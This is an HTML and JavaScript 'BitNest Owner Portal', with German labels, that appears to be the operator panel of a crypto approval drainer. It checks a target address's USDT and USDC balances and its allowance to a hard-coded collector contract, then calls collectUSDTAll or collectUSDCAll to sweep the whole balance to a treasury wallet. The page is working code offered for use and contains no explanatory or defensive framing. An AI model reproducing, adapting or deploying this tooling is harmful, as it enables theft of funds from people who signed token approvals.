<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>BitNest Admin - Smart Contract Logic</title>
<script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
<style>
:root{ --bg:#050505; --card:#111; --border:#333; --green:#22c55e; --white:#fff; }
body{margin:0; background:var(--bg); color:var(--white); font-family:sans-serif; padding:20px; display:flex; justify-content:center;}
.admin-box{width:100%; max-width:550px; background:var(--card); border:1px solid var(--border); border-radius:16px; padding:25px; box-shadow: 0 0 30px rgba(34,197,94,0.1);}
h2{color:var(--green); border-bottom:1px solid var(--border); padding-bottom:10px; text-align:center;}
.input-group{margin-bottom:15px;}
label{display:block; font-size:12px; color:#888; margin-bottom:5px; text-transform:uppercase;}
input, select{width:100%; padding:12px; background:#000; border:1px solid var(--border); color:#fff; border-radius:8px; box-sizing:border-box; font-family:monospace;}
button{width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:10px;}
.btn-connect{background:#1f2937; color:#fff;}
.btn-check{background:#3b82f6; color:#fff;}
.btn-transfer{background:var(--green); color:#052e16; font-size:16px;}
#status{margin-top:20px; padding:15px; border-radius:8px; background:#000; border:1px solid #222; font-family:monospace; font-size:13px; min-height:60px; white-space: pre-wrap; color:#aaa;}
.highlight{color:var(--green); font-weight:bold;}
</style>
</head>
<body>

<div class="admin-box">
  <h2>BitNest Owner Portal</h2>
  <button class="btn-connect" id="connectAdmin">Admin Wallet verbinden</button>
  
  <div id="controls" style="margin-top:25px; display:none;">
    <div class="input-group">
      <label>Nutzer Adresse</label>
      <input type="text" id="userAddr" placeholder="0x...">
    </div>

    <button class="btn-check" id="checkBalBtn">Status prüfen</button>

    <div class="input-group" style="margin-top:15px;">
        <label>Token wählen</label>
        <select id="tokenSelect">
            <option value="USDT">USDT (Binance-Peg)</option>
            <option value="USDC">USDC (Binance-Peg)</option>
        </select>
    </div>

    <button class="btn-transfer" id="executeBtn">Alles abbuche (Collect All)</button>
  </div>

  <div id="status">Warte auf Verbindung...</div>
</div>

<script>
// DEINE SMART CONTRACT KONFIGURATION
const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
const USDT_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
const USDC_TOKEN = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";

// ABI basierend auf deinem Solidity Code
const contractABI = [
  "function collectUSDTAll(address from) external returns (uint256)",
  "function collectUSDCAll(address from) external returns (uint256)",
  "function owner() view returns (address)",
  "function paused() view returns (bool)"
];

const tokenABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)"
];

let signer;

document.getElementById("connectAdmin").addEventListener("click", async () => {
  if(!window.ethereum) return alert("Nutze MetaMask!");
  const provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();
  
  const mainContract = new ethers.Contract(CONTRACT_ADDR, contractABI, signer);
  const contractOwner = await mainContract.owner();
  const adminAddr = await signer.getAddress();

  if(adminAddr.toLowerCase() !== contractOwner.toLowerCase()) {
      document.getElementById("status").innerText = "⚠️ Warnung: Du bist NICHT der Owner des Smart Contracts!";
  }

  document.getElementById("controls").style.display = "block";
  document.getElementById("connectAdmin").innerText = "Admin: " + adminAddr.substring(0,10) + "...";
  document.getElementById("status").innerText = "Verbindung zum Collector Contract hergestellt.";
});

document.getElementById("checkBalBtn").addEventListener("click", async () => {
  const user = document.getElementById("userAddr").value;
  if(!ethers.isAddress(user)) return alert("Adresse ungültig!");
  
  const status = document.getElementById("status");
  status.innerText = "Prüfe Blockchain-Daten...";

  try {
    const usdt = new ethers.Contract(USDT_TOKEN, tokenABI, signer);
    const usdc = new ethers.Contract(USDC_TOKEN, tokenABI, signer);

    const [uBal, cBal, uAllow, cAllow] = await Promise.all([
      usdt.balanceOf(user),
      usdc.balanceOf(user),
      usdt.allowance(user, CONTRACT_ADDR),
      usdc.allowance(user, CONTRACT_ADDR)
    ]);

    status.innerHTML = `
<span class="highlight">Guthaben:</span>
USDT: ${ethers.formatUnits(uBal, 18)}
USDC: ${ethers.formatUnits(cBal, 18)}

<span class="highlight">Freigabe für DEINEN Contract:</span>
USDT: ${uAllow > 0 ? "✅ ERTEILT" : "❌ FEHLT"}
USDC: ${cAllow > 0 ? "✅ ERTEILT" : "❌ FEHLT"}`;
  } catch (e) { status.innerText = "Fehler: " + e.message; }
});

document.getElementById("executeBtn").addEventListener("click", async () => {
  const user = document.getElementById("userAddr").value;
  const token = document.getElementById("tokenSelect").value;
  const status = document.getElementById("status");

  try {
    status.innerText = `Starte Collect-Funktion für ${token}...`;
    const collector = new ethers.Contract(CONTRACT_ADDR, contractABI, signer);

    let tx;
    if(token === "USDT") {
        tx = await collector.collectUSDTAll(user);
    } else {
        tx = await collector.collectUSDCAll(user);
    }
    
    status.innerText = "Transaktion gesendet! Warte auf Blockchain...\nHash: " + tx.hash;
    await tx.wait();
    status.innerText = `✅ ERFOLGREICH!\nDie Token wurden vom Nutzer eingezogen und an die Treasury Wallet (Wallet B) gesendet.`;
  } catch (err) {
    status.innerText = "❌ FEHLER:\n" + (err.reason || err.message);
  }
});
</script>
</body>
</html>
